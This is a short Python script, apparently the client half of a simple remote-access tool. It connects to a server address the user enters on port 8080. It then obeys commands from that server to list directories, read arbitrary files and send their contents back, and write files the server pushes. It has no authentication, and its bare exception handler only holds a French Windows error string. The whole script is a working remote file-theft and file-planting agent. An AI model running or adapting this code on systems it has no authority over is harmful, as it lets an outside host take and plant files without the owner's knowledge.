import os
import socket
s = socket.socket()
port = 8080
try:
    host = input(str("Enter server address"))
    s.connect((host, port))
    print("")
    print("Connected")
    print("")
    while True:
        command = s.recv(1024)
        command = command.decode()
        print("Recieved")
        print("")
        if command == "view_cwd":
            files = os.getcwd()
            files = str(files)
            s.send("".encode())
            s.send(files.encode())
            print("Command Executed Successfully")
        elif command == "custom_dir":
            print("Custom Directory")
            user_input = s.recv(5000)
            user_input = user_input.decode()
            files = os.listdir(user_input)
            files = str(files)
            s.send(files.encode())
        elif command == "get_file":
            file_path_name = s.recv(5000)
            file_path_name = file_path_name.decode()
            file = open(file_path_name, "rb")
            data = file.read()
            s.send(data)
        elif command == "send_file":
            file_recieved_data = s.recv(10000)
            file_name = s.recv(5000)
            file_name = file_name.decode()
            with open(file_name, "wb") as g:
                g.write(file_recieved_data)
                g.close()
        else:
            print("")
            print("command unrecognized")
except:
    "[WinError 10049] L’adresse demandée n’est pas valide dans son contexte"